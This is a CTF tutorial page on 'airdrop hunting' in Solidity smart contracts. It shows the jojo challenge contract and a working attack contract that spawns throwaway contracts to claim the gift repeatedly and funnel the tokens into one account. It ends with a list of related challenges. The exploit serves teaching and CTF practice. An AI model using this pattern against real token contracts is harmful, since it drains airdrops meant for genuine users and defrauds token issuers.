# Airdrop Hunting

## Principle
Airdrop hunting refers to an attack method where multiple different new accounts are used to call the airdrop function to obtain airdrop tokens, which are then transferred to the attacker's account to accumulate wealth. This type of attack is relatively common and straightforward — any contract with an airdrop function can be targeted. The first automated airdrop hunting attack appeared on [Simoleon](https://paper.seebug.org/646/).

## Example
Using the jojo challenge from the Digital Economy Competition 2019 as an example to explain how to carry out an airdrop hunting attack. The source code of the challenge contract is as follows:
```solidity
pragma solidity ^0.4.24;

contract jojo {
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    address owner;
        
    constructor()public{
        owner = msg.sender;
    }
    
    event SendFlag(string b64email);
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        emit SendFlag(b64email);
    }
    
    function jojogame() payable{
        uint geteth = msg.value / 1000000000000000000;
        balanceOf[msg.sender] += geteth;
    }
    
    function gift() public {
        assert(gift[msg.sender] == 0);
        balanceOf[msg.sender] += 100;
        gift[msg.sender] = 1;
    }
    
    function transfer(address to,uint value) public{
        assert(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }
    
}
```

We can see that we need to satisfy balanceOf[msg.sender] >= 100000 to get the flag.

The challenge has an airdrop function where each airdrop can increase the balance by 100.

```solidity
function gift() public {
    assert(gift[msg.sender] == 0);
    balanceOf[msg.sender] += 100;
    gift[msg.sender] = 1;
}
```

There is also a transfer function that allows transferring balance to other users.

```solidity
function transfer(address to,uint value) public{
    assert(balanceOf[msg.sender] >= value);
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;
}
```

We can use the airdrop hunting attack method by creating 1000 temporary contracts to call the airdrop function and transfer to the main contract, so that balanceOf[msg.sender] >= 100000.

```solidity
contract attack{
    function attack_airdrop(int num){
        for(int i = 0; i < num; i++){
            new middle_attack(this);
        }
    }
    
    function get_flag(string email){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.payforflag(email);
    }
}


contract middle_attack{
    constructor(address addr){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.gift();
        target.transfer(addr,100);
    }
}
```

## Challenges

### Digital Economy Competition 2019
- Challenge Name: jojo

### RoarCTF 2019
- Challenge Name: CoinFlip

### QWB 2019
- Challenge Name: babybet

### bctf 2018
- Challenge Name: Fake3d

!!! note
    Note: Challenge attachments and related content can be found in the [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) repository.

## References
- [Analysis of the First Automated Airdrop Hunting Attack on Blockchain Tokens](https://paper.seebug.org/646/)
- [Digital Economy Competition 2019 - jojo](https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo)

